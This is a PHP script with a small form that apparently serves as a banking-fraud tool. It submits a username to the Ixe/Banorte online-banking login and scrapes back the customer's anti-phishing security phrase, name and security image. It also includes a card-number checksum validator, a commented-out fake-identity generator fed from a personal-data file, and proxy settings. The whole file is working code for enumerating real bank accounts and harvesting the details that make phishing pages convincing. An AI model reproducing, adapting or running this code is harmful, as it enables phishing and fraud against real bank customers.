<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
</head>
<center><form action="" name="boten" method="post">
<div><label>Usuario Ixe: </label><center><input name="account" type="text" size="14"></center></div>
<div><center><input name="Submit" type="submit" value="Submit"></div></center>
</form></center>
<?php
require('curl.php');
error_reporting(0);
$dir = dirname(__file__);
define('COOKIE_FILE', $dir . '/cookies/' . md5(rand(100203,9999999999)) . '.txt');


if(empty($_POST["account"])){
    echo "<center>Por Favor Ingrese Usuario!!</center>";
    exit;
}
else{
    check($_POST["account"]);
}




function check($acct)
{
             $ch2 = curl_init();



curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch2, CURLOPT_HEADER, 1);
curl_setopt($ch2, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36');
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch2, CURLOPT_COOKIEFILE, COOKIE_FILE);
curl_setopt($ch2, CURLOPT_COOKIEJAR, COOKIE_FILE);

$nodup = getPage($ch2, "https://www.banorte.com/wps/portal/ixe/");

$curl_info = curl_getinfo($ch2);
$headers = substr($nodup, 0, $curl_info["header_size"]); 
preg_match("!\r\n(?:Location|URI): *(.*?) *\r\n!", $headers, $matches);

$arr = explode('/', $matches[1]);
$string = implode('/',array_slice($arr, 8,12));
$string2 = "https://www.banorte.com/wps/portal/ixe/Home/acceso-a-banco-en-linea/".$string;




             $ch = curl_init();



curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 7.0; SM-G935P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, COOKIE_FILE);
curl_setopt($ch, CURLOPT_COOKIEJAR, COOKIE_FILE);



$adressfake = getdatarand();

 
 
    $postFields['userField'] = $acct;
    $postFields['Image1.x'] = "41";
    $postFields['Image1.y'] = "9";
    $postFields['service'] = "direct/1/PortalLogin/form.form";
    $postFields['sp'] = "S0";
    $postFields['Form0'] = 'userField,$FormConditional,$ImageSubmit';
    $postFields['$FormConditional'] = "T";
    

    
$authaccount = getPage($ch, "https://nixe.ixe.com.mx/NBXI/AALoginixe.aspx?banco=IXE", $postFields, $string2);

$dataextra = getauth($authaccount);
preg_match("'<input name=\"userField\" type=\"hidden\">'si", $authaccount, $authyesorno);
preg_match("'<span id=\"lblFrase\">(.*?)</span></div>'si", $authaccount, $frase);
preg_match("'</span></span><span id=\"lblNombre\" class=\"Amarillo\" style=\"font-weight:bold;\">(.*?)</span>'si", $authaccount, $name);
if($authyesorno){
    echo "<center><h1>USUARIO NO ENCONTRADO!</h1></center>";
     curl_close($ch);
      curl_close($ch2);
}
else{
if($frase){
echo "<center><h2>Esta es la frase: ".$frase[1]."</h2></center>";
}
if($name){
echo '<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <center><h1>Nombre: '.utf8_encode($name[1]).'</h1></center>';
}
echo '<center><h3>IMAGEN: <img src="'.$dataextra[0].'"/></center>';
curl_close($ch);
 curl_close($ch2);
}

}


// function getdatarand(){
// $f = file("dir19042017.txt");
// $string = $f[rand(0, count($f) - 1)];
// $arr = explode('|', $string);
// $arr2 = explode('|', $string);

// $fname_rnd = implode('|',array_slice($arr, 1, 1));
// $lname_rnd = implode('|',array_slice($arr, 2, 1));
// $street_rnd = implode('|',array_slice($arr2, 3, 1));
// $mail_rnd = implode('|',array_slice($arr2, 4, 1));
// $phone = implode('|',array_slice($arr2, 5, 1));
// $zip = implode('|',array_slice($arr2, 6, 1));
// $city_rnd = implode('|',array_slice($arr2, 7, 1));

// $info = array($fname_rnd, $lname_rnd, $street_rnd, $zip, $city_rnd);

// return $info;

// }

function getnewexpmoth($expiram){
    if ($expmonth<10){
        $expm = substr($expiram,1,2);
    }
    else{
        $expm = $expiram;
    }
    return $expm;
}

function validateChecksum($number) {
 

$number=preg_replace('/\D/', '', $number);
 

$number_length = strlen($number);
$parity = $number_length % 2;
 

$total=0;
for ($i=0; $i<$number_length; $i++) {
$digit=$number[$i];

if ($i % 2 == $parity) {
$digit*=2;

if ($digit > 9) {
$digit-=9;
}
}

$total+=$digit;
}

return ($total % 10 == 0) ? TRUE : FALSE;
}

function getcookie($html){
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $html, $matches);
$cookies = array();
foreach($matches[1] as $item) {
    parse_str($item, $cookie);
    $cookies = array_merge($cookies, $cookie);
}
return $cookies["Location"];
}


function getauth($html){

$dom = new DOMDocument();
@$dom->loadHTML($html);
foreach($dom->getElementsByTagName('img') as $input) {

 if ($input->getAttribute("id") == "imgImagen") {
        $base64img = $input->getAttribute('src');

         }
}
foreach($dom->getElementsByTagName('input') as $input) {

 if ($input->getAttribute("name") == "__VIEWSTATEGENERATOR") {
        $viewstategen = $input->getAttribute('value');

         }
 if ($input->getAttribute("name") == "__EVENTVALIDATION") {
        $eventvalid = $input->getAttribute('value');

         }
 if ($input->getAttribute("name") == "__VIEWSTATE") {
        $viewstate = $input->getAttribute('value');

         }       
         
}
$info = array($base64img,$viewstategen,$eventvalid,$viewstate);

return $info;
}



function getPage(&$ch , $url , $postFields=null, $referer=null)
{
    if ($referer != null){
        curl_setopt($ch, CURLOPT_REFERER, $referer);
    }
    
      if($postFields != null)
    {
        $postString = "";
        foreach($postFields as $key => $value) {
            $postString .= $key . '=' . urlencode($value) . '&';
        }

        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postString);
    }
    // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    // curl_setopt($ch, CURLOPT_PROXY, "localhost:1071");
    // curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    $result = curl_exec($ch);
    return $result;
    
    }

?>
